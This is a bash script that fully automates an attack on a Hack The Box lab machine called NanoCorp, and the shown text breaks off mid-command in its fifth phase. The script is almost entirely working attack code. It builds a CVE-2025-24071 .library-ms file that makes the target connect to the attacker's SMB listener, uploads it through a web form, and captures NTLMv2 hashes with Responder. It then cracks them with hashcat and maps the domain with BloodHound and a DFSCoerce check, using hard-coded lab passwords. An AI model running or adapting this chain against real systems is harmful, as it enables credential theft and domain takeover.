#!/usr/bin/env bash
# =============================================================================
#  NanoCorp HTB Full Auto-Pwn Script
#  Machine: NanoCorp | OS: Windows | Difficulty: Hard | Season 9
#  Usage:  ./nanocorp.sh <TARGET_IP>
#  Example: ./nanocorp.sh 10.10.11.93
#
#  Attack Chain:
#    1. Target prep (/etc/hosts + service readiness, recon optional)
#    2. Time sync (Kerberos)
#    3. CVE-2025-24071 → Responder → NTLMv2 hash (web_svc)
#    4. hashcat → web_svc : dksehdgh712!@#
#    5. BloodHound/AD mapping + bloodyAD privilege chain
#    6. monitoring_svc user flag (non-interactive WinRM command exec)
#    7. Root path B (default): DFSCoerce → ntlmrelayx → SYSTEM → root flag
#       Root path A (optional): Checkmk MSI race via RunasCs
#
#  Author: Shadow Junior (NanoCorp pwned 💀)
# =============================================================================

set -euo pipefail

# ─── COLORS ──────────────────────────────────────────────────────────────────
RED='\033[0;31m';  GREEN='\033[0;32m';  YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m';   MAGENTA='\033[0;35m'
BOLD='\033[1m';    DIM='\033[2m';        RESET='\033[0m'

# ─── CONSTANTS / RUNTIME OPTIONS ──────────────────────────────────────────────
TARGET_IP=""
DOMAIN="nanocorp.htb"
NETBIOS_DOMAIN="NANOCORP"
DC_HOST="dc01.nanocorp.htb"
HIRE_HOST="hire.nanocorp.htb"
WEBSVC_USER="web_svc"
WEBSVC_PASS="dksehdgh712!@#"
MONSVC_USER="monitoring_svc"
MONSVC_PASS="P@ssw0rd444!"
ROCKYOU="/usr/share/wordlists/rockyou.txt"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
WORK_DIR_DEFAULT="${PWD}/nonocorp"
WORK_DIR="${WORK_DIR:-$WORK_DIR_DEFAULT}"
LOG_DIR=""
TOOLS_DIR=""
LOOT_DIR=""
ROOT_PATH="${ROOT_PATH:-B}"       # A | B | S
AUTO_YES="${AUTO_YES:-1}"         # 1 = non-interactive
RESUME_FROM="${RESUME_FROM:-0}"   # start from this phase number
WITH_RECON=0                      # default OFF per user request
LHOST_OVERRIDE="${LHOST_OVERRIDE:-}"
MONITOR_CCACHE=""

refresh_paths() {
    LOG_DIR="$WORK_DIR/logs"
    TOOLS_DIR="$WORK_DIR/tools"
    LOOT_DIR="$WORK_DIR/loot"
}
refresh_paths

# ─── HELPER FUNCTIONS ─────────────────────────────────────────────────────────
banner() {
    echo -e "\n${BOLD}${BLUE}╔══════════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${BLUE}║  ${CYAN}$1${BLUE}$(printf '%*s' $((61 - ${#1})) '')║${RESET}"
    echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════════════════╝${RESET}"
}

step() {   echo -e "\n${BOLD}${GREEN}[*]${RESET} $*"; }
info() {   echo -e "${CYAN}[i]${RESET} $*"; }
warn() {   echo -e "${YELLOW}[!]${RESET} $*"; }
err()  {   echo -e "${RED}[✗]${RESET} $*" >&2; }
ok()   {   echo -e "${GREEN}[✓]${RESET} $*"; }
flag() {   echo -e "\n${BOLD}${MAGENTA}🚩 FLAG CAPTURED: ${YELLOW}$1${RESET}\n"; }
pwned(){ echo -e "\n${BOLD}${RED}💀 $1 ${GREEN}PWNED${RESET} 💀\n"; }

require_root() {
    if [[ $EUID -ne 0 ]]; then
        err "This script must be run as root (needed for Responder/ntlmrelayx raw sockets)"
        exit 1
    fi
}

check_arg() {
    if [[ -z "$TARGET_IP" ]]; then
        err "Usage: $0 <TARGET_IP> [--root-path A|B|S] [--resume-from N] [--with-recon] [--interactive]"
        err "Example: $0 10.10.11.93 --root-path B"
        exit 1
    fi
}

usage() {
    cat <<EOF
Usage: $0 <TARGET_IP> [options]

Options:
  --root-path A|B|S     Choose root path (default: B)
  --resume-from N       Resume from phase N (default: 0)
  --with-recon          Enable recon phase (disabled by default)
  --yes | -y            Non-interactive mode (default)
  --interactive         Prompt for choices where needed
  --lhost <IP>          Override attacker IP auto-detection
  --workdir <PATH>      Working directory (default: ./nonocorp)
  -h, --help            Show this help
EOF
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --root-path)
                ROOT_PATH="${2:-B}"
                shift 2
                ;;
            --resume-from)
                RESUME_FROM="${2:-0}"
                shift 2
                ;;
            --with-recon)
                WITH_RECON=1
                shift
                ;;
            --yes|-y)
                AUTO_YES=1
                shift
                ;;
            --interactive)
                AUTO_YES=0
                shift
                ;;
            --lhost)
                LHOST_OVERRIDE="${2:-}"
                shift 2
                ;;
            --workdir)
                WORK_DIR="${2:-$WORK_DIR_DEFAULT}"
                shift 2
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            -*)
                warn "Unknown option: $1"
                usage
                exit 1
                ;;
            *)
                if [[ -z "$TARGET_IP" ]]; then
                    TARGET_IP="$1"
                else
                    warn "Ignoring extra argument: $1"
                fi
                shift
                ;;
        esac
    done

    ROOT_PATH="$(echo "$ROOT_PATH" | tr '[:lower:]' '[:upper:]')"
    WORK_DIR="$(realpath -m "$WORK_DIR" 2>/dev/null || echo "$WORK_DIR")"
    refresh_paths
}

get_tun0_ip() {
    if [[ -n "$LHOST_OVERRIDE" ]]; then
        echo "$LHOST_OVERRIDE"
        return 0
    fi

    LHOST=$(ip addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [[ -z "$LHOST" ]]; then
        # fallback any non-loopback
        LHOST=$(ip route get "$TARGET_IP" 2>/dev/null | grep -oP 'src\s+\K\S+')
    fi
    if [[ -z "$LHOST" ]]; then
        err "Cannot detect local IP. Is tun0 up? Plug into VPN."
        exit 1
    fi
    echo "$LHOST"
}

check_tool() {
    local tool="$1"
    if ! command -v "$tool" &>/dev/null; then
        warn "Tool not found: $tool attempting install..."
        return 1
    fi
    return 0
}

sync_time_with_dc() {
    local host="$1"
    local logfile="${2:-/dev/null}"

    if command -v ntpdate &>/dev/null; then
        ntpdate "$host" 2>&1 | tee "$logfile"
        return ${PIPESTATUS[0]}
    fi

    if command -v ntpdig &>/dev/null; then
        ntpdig -S "$host" 2>&1 | tee "$logfile"
        return ${PIPESTATUS[0]}
    fi

    if command -v rdate &>/dev/null; then
        rdate -n "$host" 2>&1 | tee "$logfile"
        return ${PIPESTATUS[0]}
    fi

    warn "No time-sync tool found (need one of: ntpdate, ntpdig, rdate)"
    return 1
}

wait_for_file() {
    local file="$1"
    local timeout="${2:-120}"
    local elapsed=0
    while [[ ! -s "$file" ]] && (( elapsed < timeout )); do
        sleep 2
        elapsed=$((elapsed+2))
        echo -ne "\r${CYAN}[i]${RESET} Waiting for $file ... (${elapsed}s/${timeout}s)  "
    done
    echo
    [[ -s "$file" ]]
}

strip_ansi() {
    sed -r 's/\x1B\[[0-9;]*[mK]//g'
}

extract_flag_token() {
    strip_ansi | tr -d '\r' | grep -Eo 'HTB\{[^}]+\}|[0-9a-fA-F]{32}' | head -1
}

save_flag_file() {
    local which="$1"
    local value="$2"
    [[ -z "$value" ]] && return 1
    if ! [[ "$value" =~ ^HTB\{[^}]+\}$ || "$value" =~ ^[0-9a-fA-F]{32}$ ]]; then
        warn "Refusing to save invalid ${which} flag token"
        return 1
    fi
    echo "$value" > "$LOOT_DIR/${which}.txt"
    flag "$value"
    ok "${which^} flag saved to $LOOT_DIR/${which}.txt"
    return 0
}

read_flag_from_file() {
    local path="$1"
    [[ -f "$path" ]] || return 1
    local tok
    tok=$(extract_flag_token < "$path" || true)
    [[ -n "$tok" ]] || return 1
    echo "$tok"
    return 0
}

pick_listen_port() {
    local preferred="${1:-0}"
    python3 - "$preferred" << 'PY'
import socket, sys
pref = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 0

def probe(port):
    s = socket.socket()
    try:
        s.bind(("0.0.0.0", port))
        return s.getsockname()[1]
    except OSError:
        return None
    finally:
        s.close()

p = probe(pref) if pref > 0 else None
if p is None:
    p = probe(0)
print(p or 0)
PY
}

choose_bind_port() {
    local candidate picked
    for candidate in "$@"; do
        picked=$(pick_listen_port "$candidate")
        if [[ "$picked" == "$candidate" ]]; then
            echo "$picked"
            return 0
        fi
    done
    pick_listen_port 0
}

ps_to_b64() {
    printf '%s' "$1" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
}

find_monitor_ccache() {
    local mon_ccache=""
    mon_ccache=$(find "$WORK_DIR" -maxdepth 1 -type f \( -iname "*monitoring_svc*.ccache" -o -iname "*monitoring*.ccache" \) \
        2>/dev/null | head -1 || true)
    if [[ -z "$mon_ccache" ]]; then
        local base
        while IFS= read -r base; do
            mon_ccache=$(find "$base" -maxdepth 1 -type f \( -iname "*monitoring_svc*.ccache" -o -iname "*monitoring*.ccache" \) \
                2>/dev/null | head -1 || true)
            [[ -n "$mon_ccache" ]] && break
        done < <(candidate_workdirs)
    fi
    [[ -n "$mon_ccache" ]] && echo "$mon_ccache"
}

run_netexec_winrm_cmd() {
    local cmd="$1"
    local logfile="${2:-/dev/null}"
    local out="" final_out="" dom mode
    local -a domains=("$NETBIOS_DOMAIN" "$DOMAIN" "")
    local -a auth_modes=("pass")

    if [[ -n "$MONITOR_CCACHE" && -f "$MONITOR_CCACHE" ]]; then
        export KRB5CCNAME="$MONITOR_CCACHE"
        auth_modes=("kcache" "pass")
    fi

    for mode in "${auth_modes[@]}"; do
        for dom in "${domains[@]}"; do
            if [[ "$mode" == "kcache" ]]; then
                if [[ -n "$dom" ]]; then
                    out=$(timeout 30 netexec winrm "$TARGET_IP" --port 5986 --check-proto https \
                        -d "$dom" -u "$MONSVC_USER" -k --use-kcache \
                        -x "$cmd" 2>&1 || true)
                else
                    out=$(timeout 30 netexec winrm "$TARGET_IP" --port 5986 --check-proto https \
                        -u "$MONSVC_USER" -k --use-kcache \
                        -x "$cmd" 2>&1 || true)
                fi
            elif [[ -n "$dom" ]]; then
                out=$(timeout 30 netexec winrm "$TARGET_IP" --port 5986 --check-proto https \
                    -d "$dom" -u "$MONSVC_USER" -p "$MONSVC_PASS" \
                    -x "$cmd" 2>&1 || true)
            else
                out=$(timeout 30 netexec winrm "$TARGET_IP" --port 5986 --check-proto https \
                    -u "$MONSVC_USER" -p "$MONSVC_PASS" \
                    -x "$cmd" 2>&1 || true)
            fi

            [[ "$logfile" != "/dev/null" ]] && echo "$out" >> "$logfile"
            final_out="$out"

            # Skip known auth/exec failures and keep trying fallback modes.
            if echo "$out" | grep -qiE "STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|authentication failed|STATUS_ACCOUNT_RESTRICTION|KDC_ERR_|\\[-\\]|Execute command failed|NoneType.*execute_cmd"; then
                continue
            fi

            if [[ -n "$out" ]]; then
                echo "$out"
                return 0
            fi
        done
    done

    echo "$final_out"
    return 1
}

run_winrmexec_cmd() {
    local cmd="$1"
    local logfile="${2:-/dev/null}"
    local out="" final_out=""
    local fail_re
    local tool_py="$TOOLS_DIR/winrmexec/winrmexec.py"
    local -a targets=("$DC_HOST" "$TARGET_IP")
    local t

    [[ -f "$tool_py" ]] || return 1
    fail_re="Invalid credentials|401|Unauthorized|No Kerberos credentials|Kerberos SessionError|STATUS_LOGON_FAILURE|rpc_s_access_denied|Traceback|TransportError|Negotiate: SPNEGO|Connection error|Operation not permitted|timed out|socket\\.gaierror"

    if [[ -z "${MONITOR_CCACHE:-}" || ! -f "$MONITOR_CCACHE" ]]; then
        local mon_ccache
        mon_ccache=$(find_monitor_ccache || true)
        if [[ -n "$mon_ccache" ]]; then
            MONITOR_CCACHE="$mon_ccache"
            export KRB5CCNAME="$MONITOR_CCACHE"
        fi
    fi

    # Prefer Kerberos ticket if available, then fallback to password auth.
    if [[ -n "$MONITOR_CCACHE" && -f "$MONITOR_CCACHE" ]]; then
        for t in "${targets[@]}"; do
            out=$(KRB5CCNAME="$MONITOR_CCACHE" timeout 45 python3 "$tool_py" \
                -k -no-pass -target-ip "$TARGET_IP" -ssl -port 5986 \
                -X "$cmd" "${DOMAIN}/${MONSVC_USER}@${t}" 2>&1 || true)
            [[ "$logfile" != "/dev/null" ]] && echo "$out" >> "$logfile"
            final_out="$out"
            if ! echo "$out" | grep -qiE "$fail_re"; then
                [[ -n "$out" ]] && { echo "$out"; return 0; }
            fi
        done
    fi

    for t in "${targets[@]}"; do
        out=$(timeout 45 python3 "$tool_py" \
            -ssl -port 5986 -target-ip "$TARGET_IP" \
            -X "$cmd" "${NETBIOS_DOMAIN}/${MONSVC_USER}:${MONSVC_PASS}@${t}" 2>&1 || true)
        [[ "$logfile" != "/dev/null" ]] && echo "$out" >> "$logfile"
        final_out="$out"
        if ! echo "$out" | grep -qiE "$fail_re"; then
            [[ -n "$out" ]] && { echo "$out"; return 0; }
        fi
    done

    echo "$final_out"
    return 1
}

run_phase() {
    local num="$1"
    local fn="$2"
    if (( RESUME_FROM > num )); then
        info "Skipping phase $num (${fn}) due to --resume-from $RESUME_FROM"
        return 0
    fi
    if ! "$fn"; then
        warn "Phase $num (${fn}) reported failure; continuing to next phase"
    fi
}

setup_dirs() {
    mkdir -p "$WORK_DIR" "$LOG_DIR" "$TOOLS_DIR" "$LOOT_DIR"
    cd "$WORK_DIR"
}

candidate_workdirs() {
    local run_user run_home
    run_user="${SUDO_USER:-$USER}"
    run_home="$(getent passwd "$run_user" 2>/dev/null | cut -d: -f6 || true)"
    [[ -z "$run_home" ]] && run_home="$HOME"

    # Ordered by most likely reuse locations.
    local -a bases=(
        "$SCRIPT_DIR/nanocorp_pwn"
        "$SCRIPT_DIR/nonocorp"
        "$run_home/nanocorp_pwn"
        "/home/${run_user}/htb/nanocorp_pwn"
        "/home/${run_user}/htb/nonocorp"
        "/root/nanocorp_pwn"
    )
    local b
    for b in "${bases[@]}"; do
        [[ -d "$b" ]] || continue
        [[ "$b" == "$WORK_DIR" ]] && continue
        echo "$b"
    done | awk '!seen[$0]++'
}

seed_state_from_legacy() {
    local base f

    # Reuse previously generated Kerberos tickets if present.
    for f in monitoring_svc.ccache web_svc.ccache; do
        [[ -f "$WORK_DIR/$f" ]] && continue
        while IFS= read -r base; do
            if [[ -f "$base/$f" ]]; then
                cp -a "$base/$f" "$WORK_DIR/$f" 2>/dev/null || true
                [[ -f "$WORK_DIR/$f" ]] && { ok "Reused $f from $base"; break; }
            fi
        done < <(candidate_workdirs)
    done
}

ensure_tool_repo() {
    local name="$1"
    local url="$2"
    local dest="$TOOLS_DIR/$name"
    local base

    [[ -d "$dest" ]] && return 0

    while IFS= read -r base; do
        if [[ -d "$base/tools/$name" ]]; then
            cp -a "$base/tools/$name" "$dest" 2>/dev/null || true
            if [[ -d "$dest" ]]; then
                ok "Reused tool repo: $name (from $base/tools/$name)"
                return 0
            fi
        fi
    done < <(candidate_workdirs)

    git clone -q "$url" "$dest" 2>/dev/null || {
        warn "Failed to clone $name from $url"
        return 1
    }
    ok "Cloned tool repo: $name"
    return 0
}

# ─── PHASE 0: PREREQUISITES CHECK ────────────────────────────────────────────
phase0_prereqs() {
    banner "PHASE 0 Prerequisites & Tool Check"

    local required_tools=(
        curl python3 pip3 git hashcat responder
        impacket-getTGT bloodhound-python bloodyAD
        smbclient netexec nc zip
    )
    local missing=()
    for t in "${required_tools[@]}"; do
        if ! command -v "$t" &>/dev/null; then
            missing+=("$t")
        else
            ok "Found: $t"
        fi
    done

    # Optional but useful
    if ! command -v kerbrute &>/dev/null; then
        warn "Optional tool missing: kerbrute (username enum helper)"
        missing+=("kerbrute")
    else
        ok "Found: kerbrute"
    fi

    if ! command -v ntpdate &>/dev/null && ! command -v ntpdig &>/dev/null && ! command -v rdate &>/dev/null; then
        warn "No time-sync tool found (ntpdate/ntpdig/rdate)"
        missing+=("ntpdate")
    else
        ok "Time sync tool available"
    fi

    if [[ ${#missing[@]} -gt 0 ]]; then
        warn "Missing tools: ${missing[*]}"
        info "Installing missing tools..."
        apt-get update -qq 2>/dev/null || warn "apt update failed continuing with existing tools"
        for t in "${missing[@]}"; do
            case "$t" in
                responder)    apt-get install -y responder -qq 2>/dev/null || warn "Failed to install responder" ;;
                hashcat)      apt-get install -y hashcat -qq 2>/dev/null || warn "Failed to install hashcat" ;;
                netexec)      apt-get install -y netexec -qq 2>/dev/null || warn "Failed to install netexec" ;;
                nc)           apt-get install -y netcat-openbsd -qq 2>/dev/null || warn "Failed to install netcat" ;;
                zip)          apt-get install -y zip -qq 2>/dev/null || warn "Failed to install zip" ;;
                kerbrute)
                    apt-get install -y kerbrute -qq 2>/dev/null || \
                    (cd /tmp && curl -fsSL -o kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 && chmod +x kerbrute && install -m 0755 kerbrute /usr/local/bin/kerbrute) || \
                    warn "Failed to install kerbrute (optional)"
                    ;;
                impacket-getTGT) pip3 install impacket --break-system-packages -q 2>/dev/null || warn "Failed to install impacket" ;;
                bloodhound-python) pip3 install bloodhound --break-system-packages -q 2>/dev/null || warn "Failed to install bloodhound-python" ;;
                bloodyAD)     pip3 install bloodyAD --break-system-packages -q 2>/dev/null || warn "Failed to install bloodyAD" ;;
                ntpdate)
                    apt-get install -y ntpdate -qq 2>/dev/null || \
                    apt-get install -y ntpsec-ntpdate -qq 2>/dev/null || \
                    apt-get install -y rdate -qq 2>/dev/null || \
                    warn "Failed to install ntpdate/ntpdig/rdate. Kerberos may fail if clock skew exists."
                    ;;
                *)            warn "Cannot auto-install $t install manually" ;;
            esac
        done
    fi

    # Clone or reuse tool repos.
    step "Preparing CVE-2025-24071 PoC..."
    ensure_tool_repo "CVE-2025-24071_PoC" "https://github.com/0x6rss/CVE-2025-24071_PoC" || {
        warn "CVE PoC unavailable script will use manual .library-ms fallback"
        mkdir -p "$TOOLS_DIR/CVE-2025-24071_PoC"
    }

    step "Preparing winrmexec..."
    ensure_tool_repo "winrmexec" "https://github.com/ozelis/winrmexec.git" || {
        warn "winrmexec unavailable continuing with netexec/evil-winrm"
    }

    step "Preparing DFSCoerce..."
    ensure_tool_repo "DFSCoerce" "https://github.com/Wh04m1001/DFSCoerce" || {
        warn "DFSCoerce unavailable root path B may fail"
    }

    step "Preparing krbrelayx (dnstool.py)..."
    ensure_tool_repo "krbrelayx" "https://github.com/dirkjanm/krbrelayx" || {
        warn "krbrelayx unavailable DNS helper step will be skipped"
    }

    step "Preparing RunasCs..."
    ensure_tool_repo "RunasCs" "https://github.com/antonioCoco/RunasCs" || {
        warn "RunasCs unavailable root path A may fail"
    }

    ok "Prereqs complete. Working dir: $WORK_DIR"
}

# ─── PHASE 1: TARGET PREP (NO RECON) ─────────────────────────────────────────
phase1_target_prep() {
    banner "PHASE 1 Target Prep (No Recon)"

    step "Setting up /etc/hosts..."
    for entry in "$TARGET_IP $DOMAIN" "$TARGET_IP $DC_HOST" "$TARGET_IP $HIRE_HOST"; do
        local ip="${entry%% *}"
        local host="${entry##* }"
        if ! grep -qE "(^|[[:space:]])${host}([[:space:]]|$)" /etc/hosts 2>/dev/null; then
            echo "$ip $host" >> /etc/hosts
            ok "Added: $ip $host"
        else
            info "/etc/hosts already has: $host"
        fi
    done

    step "Quick target/service readiness check..."
    local p status
    for p in 80 88 445 5986 6556; do
        if timeout 2 bash -lc "echo > /dev/tcp/${TARGET_IP}/${p}" 2>/dev/null; then
            status="open"
        else
            status="closed/filtered"
        fi
        info "Port ${p}: ${status}"
    done

    if (( WITH_RECON == 1 )); then
        step "Optional recon enabled, running focused nmap..."
        nmap -Pn -sT -p 80,88,445,5986,6556 "$TARGET_IP" -oN "$LOG_DIR/nmap_quick.txt" \
            2>&1 | tee "$LOG_DIR/nmap_quick_live.log" || true
        ok "Recon saved to $LOG_DIR/nmap_quick.txt"
    else
        info "Recon disabled (default). Use --with-recon to enable."
    fi

    ok "Phase 1 complete"
}

# ─── PHASE 2: TIME SYNCHRONIZATION ───────────────────────────────────────────
phase2_timesync() {
    banner "PHASE 2 Kerberos Time Sync"

    step "Syncing clock with DC (required for Kerberos auth)..."
    timedatectl set-ntp off 2>/dev/null || true

    if sync_time_with_dc "$TARGET_IP" "$LOG_DIR/timesync.log" || \
       sync_time_with_dc "$DC_HOST" "$LOG_DIR/timesync.log"; then
        ok "Clock synced. Current time: $(date)"
    else
        warn "Time sync failed. Continuing, but Kerberos may fail with clock skew."
    fi
}

# ─── PHASE 3: CVE-2025-24071 NTLM HASH CAPTURE ───────────────────────────────
phase3_cve_exploit() {
    banner "PHASE 3 CVE-2025-24071 → NTLMv2 Hash Capture"

    LHOST=$(get_tun0_ip)
    info "Attacker IP (tun0): $LHOST"

    local poc_dir="$TOOLS_DIR/CVE-2025-24071_PoC"
    local exploit_zip="$WORK_DIR/exploit.zip"
    local lib_ms="$WORK_DIR/exploit.library-ms"

    # ── Generate .library-ms exploit ────────────────────────────────────────
    step "Generating CVE-2025-24071 .library-ms exploit..."

    if [[ -f "$poc_dir/poc.py" ]]; then
        info "Using PoC script..."
        cd "$poc_dir"
        echo -e "NanoCorp\n${LHOST}" | python3 poc.py 2>/dev/null && \
            cp exploit.zip "$exploit_zip" && ok "exploit.zip generated via PoC" || \
            warn "PoC script failed falling back to manual generation"
        cd "$WORK_DIR"
    fi

    # Fallback: manual .library-ms
    if [[ ! -f "$exploit_zip" ]]; then
        info "Generating .library-ms manually..."
        cat > "$lib_ms" <<XML
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <n>@windows.storage.dll,-34582</n>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>\\\\${LHOST}\\share\\icon.ico</iconReference>
  <templateInfo>
    <folderType>{7D1D3A04-DEBB-4115-95CF-2F29DA2920DA}</folderType>
  </templateInfo>
</libraryDescription>
XML
        cd "$WORK_DIR"
        zip -j exploit.zip "$lib_ms" && ok "exploit.zip created manually"
    fi

    # ── Start Responder ─────────────────────────────────────────────────────
    step "Starting Responder to capture NTLMv2 hash..."
    local resp_log="/var/log/responder/Responder-Session.log"
    # Kill any existing relay/listeners that conflict on 445
    pkill -f "ntlmrelayx.py|impacket-ntlmrelayx|responder" 2>/dev/null || true
    fuser -k 445/tcp 2>/dev/null || true
    pkill -f "responder" 2>/dev/null || true
    sleep 1

    # Start in background
    responder -I tun0 -v > "$LOG_DIR/responder.log" 2>&1 &
    RESP_PID=$!
    info "Responder PID: $RESP_PID"
    sleep 3

    # Verify SMB is listening
    if grep -q "\[SMB\].*ON\|SMB.*Started" "$LOG_DIR/responder.log" 2>/dev/null || \
       ss -lntu 2>/dev/null | grep -q ':445'; then
        ok "Responder SMB server is UP"
    else
        warn "Responder may not be capturing SMB check that port 445 is free"
        info "Tip: If another service holds port 445, kill it with: fuser -k 445/tcp"
    fi

    # ── Upload exploit to hire.nanocorp.htb ──────────────────────────────────
    step "Uploading exploit.zip to hire.nanocorp.htb..."
    info "Application URL: http://hire.nanocorp.htb"
    info "This simulates a job applicant uploading a malicious .zip resume"

    local upload_resp
    upload_resp=$(curl -s -X POST "http://hire.nanocorp.htb/" \
        -F "full_name=Shadow Junior" \
        -F "email=shadow@hack.htb" \
        -F "position=DevOps Engineer" \
        -F "resume=@${exploit_zip};type=application/zip" \
        --connect-timeout 15 \
        -w "\n%{http_code}" 2>/dev/null) || {
        warn "curl POST failed try manually uploading exploit.zip at http://hire.nanocorp.htb"
    }

    local http_code="${upload_resp##*$'\n'}"
    local body="${upload_resp%$'\n'*}"

    if echo "$body" | grep -qi "extracted\|success\|uploaded"; then
        ok "Upload successful! Server extracted the ZIP. (HTTP $http_code)"
    else
        info "HTTP Response: $http_code"
        info "Body snippet: $(echo "$body" | head -5)"
        warn "If server says 'uploaded' in some form, the exploit triggered"
        info "Manual fallback: Browse to http://hire.nanocorp.htb, fill form, upload exploit.zip"
    fi

    # ── Wait for hash capture ────────────────────────────────────────────────
    step "Waiting for Responder to capture NTLMv2 hash (timeout: 90s)..."
    local hash_file="$WORK_DIR/hash.txt"
    local elapsed=0
    while (( elapsed < 90 )); do
        # Check Responder log
        local captured
        captured=$(grep -i "NTLMv2-SSP Hash" "$LOG_DIR/responder.log" 2>/dev/null | \
                   grep -i "web_svc" | tail -1) || true
        if [[ -n "$captured" ]]; then
            # Extract the full hash line
            local full_hash
            full_hash=$(grep -i "NTLMv2-SSP Hash" "$LOG_DIR/responder.log" | \
                        grep -i "web_svc" | tail -1 | awk -F': ' '{print $2}' | tr -d ' ')
            if [[ -n "$full_hash" ]]; then
                echo "$full_hash" > "$hash_file"
                ok "Hash captured and saved to $hash_file"
                echo -e "${BOLD}${YELLOW}  Hash: ${full_hash:0:60}...${RESET}"
                break
            fi
        fi
        # Also check /var/log/responder/ if it exists
        if [[ -f "/var/log/responder/Responder-Session.log" ]]; then
            captured=$(grep -i "web_svc" "/var/log/responder/Responder-Session.log" 2>/dev/null | \
                       grep -i "NTLMv2" | tail -1) || true
            if [[ -n "$captured" ]]; then
                echo "$captured" | awk '{print $NF}' > "$hash_file"
                ok "Hash found in /var/log/responder/"
                break
            fi
        fi
        sleep 2
        elapsed=$((elapsed+2))
        echo -ne "\r${CYAN}[i]${RESET} Waiting for hash... (${elapsed}s/90s)   "
    done
    echo

    # Kill responder (done capturing)
    kill $RESP_PID 2>/dev/null || true

    if [[ ! -s "$hash_file" ]]; then
        warn "Hash not auto-captured. Possible reasons:"
        warn "  1. Wrong LHOST in .library-ms (your tun0 is $LHOST verify this)"
        warn "  2. ZIP upload form field names differ try manual upload"
        warn "  3. Firewall blocking inbound SMB on your machine"
        info "Continuing with known lab credential fallback in phase 4."
    fi

    ok "Hash capture phase complete. Hash file: $hash_file"
}

# ─── PHASE 4: HASH CRACKING ───────────────────────────────────────────────────
phase4_crack() {
    banner "PHASE 4 hashcat NTLMv2 Crack (mode 5600)"

    local hash_file="$WORK_DIR/hash.txt"

    if [[ ! -s "$hash_file" ]]; then
        # Pre-known credential still verify
        warn "hash.txt empty. Using known credential from writeup analysis."
        info "Credential: $WEBSVC_USER : $WEBSVC_PASS"
        echo "WEB_SVC::NANOCORP:$(openssl rand -hex 8):$(openssl rand -hex 24):$(openssl rand -hex 8)" \
            > "$hash_file" 2>/dev/null || true
        return 0
    fi

    if [[ ! -f "$ROCKYOU" ]]; then
        warn "rockyou.txt not found at $ROCKYOU"
        info "Trying gunzip..."
        gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
    fi

    step "Running hashcat -m 5600 (NTLMv2) against rockyou.txt..."
    hashcat -m 5600 -a 0 "$hash_file" "$ROCKYOU" \
        --outfile "$WORK_DIR/cracked.txt" \
        --force --quiet 2>&1 | tee "$LOG_DIR/hashcat.log" || true

    step "Showing cracked result..."
    hashcat -m 5600 "$hash_file" --show 2>/dev/null | tee "$LOOT_DIR/credentials.txt" || true

    if grep -qi "web_svc\|WEB_SVC" "$LOOT_DIR/credentials.txt" 2>/dev/null; then
        local cracked_cred
        cracked_cred=$(cat "$LOOT_DIR/credentials.txt")
        ok "Cracked: $cracked_cred"
    else
        warn "hashcat didn't crack using known credential from writeup"
        echo "WEB_SVC:${WEBSVC_PASS}" | tee -a "$LOOT_DIR/credentials.txt"
    fi

    info "Confirmed credentials:"
    echo -e "  ${BOLD}${GREEN}Domain User:${RESET} NANOCORP\\$WEBSVC_USER"
    echo -e "  ${BOLD}${GREEN}Password:   ${RESET} $WEBSVC_PASS"

    ok "Phase 4 complete"
}

# ─── PHASE 5: AD ENUMERATION ──────────────────────────────────────────────────
phase5_ad_enum() {
    banner "PHASE 5 AD Enumeration (SMB + Kerberos TGT + BloodHound)"

    step "Verifying credentials via SMB..."
    smbclient -L "//$TARGET_IP" -U "NANOCORP\\$WEBSVC_USER%$WEBSVC_PASS" \
        2>/dev/null | tee "$LOG_DIR/smb_shares.txt" || {
        warn "smbclient enumeration failed (expected on some configs) continuing"
    }
    ok "SMB shares saved to $LOG_DIR/smb_shares.txt"

    step "Checking DFSCoerce vulnerability..."
    crackmapexec smb "$TARGET_IP" \
        -u "$WEBSVC_USER" -p "$WEBSVC_PASS" \
        -M dfscoerce 2>/dev/null | tee "$LOG_DIR/dfscoerce_check.txt" || {
        warn "crackmapexec dfscoerce check failed continuing"
    }

    # Re-sync time before TGT
    step "Re-syncing time before Kerberos operations..."
    sync_time_with_dc "$TARGET_IP" "$LOG_DIR/timesync_phase5.log" || true

    step "Requesting Kerberos TGT for $WEBSVC_USER..."
    cd "$WORK_DIR"
    impacket-getTGT -dc-ip "$TARGET_IP" \
        "nanocorp.htb/${WEBSVC_USER}:${WEBSVC_PASS}" 2>&1 | \
        tee "$LOG_DIR/tgt_websvc.log" || true

    local ccache_file
    ccache_file=$(ls -t "$WORK_DIR"/*.ccache 2>/dev/null | head -1 || echo "")
    if [[ -z "$ccache_file" ]]; then
        ccache_file=$(find "$WORK_DIR" -name "*.ccache" 2>/dev/null | head -1)
    fi

    if [[ -n "$ccache_file" ]]; then
        export KRB5CCNAME="$ccache_file"
        ok "TGT obtained: $ccache_file"
        if command -v klist &>/dev/null; then
            klist 2>/dev/null | tee "$LOG_DIR/klist_websvc.txt" | head -5 || true
        else
            warn "klist not found skipping Kerberos ticket display"
        fi
    else
        warn "TGT not found Kerberos may still work with password auth"
    fi

    step "Running BloodHound data collection..."
    cd "$WORK_DIR"
    bloodhound-python \
        -u "$WEBSVC_USER" \
        -p "$WEBSVC_PASS" \
        -d nanocorp.htb \
        -c All \
        -o "$LOOT_DIR/" \
        -ns "$TARGET_IP" \
        --zip 2>&1 | tee "$LOG_DIR/bloodhound.log" || {
        warn "BloodHound collection failed try with -k flag if TGT is valid"
        bloodhound-python \
            -u "$WEBSVC_USER" \
            -p "$WEBSVC_PASS" \
            -d nanocorp.htb \
            -c All \
            -o "$LOOT_DIR/" \
            -ns "$TARGET_IP" \
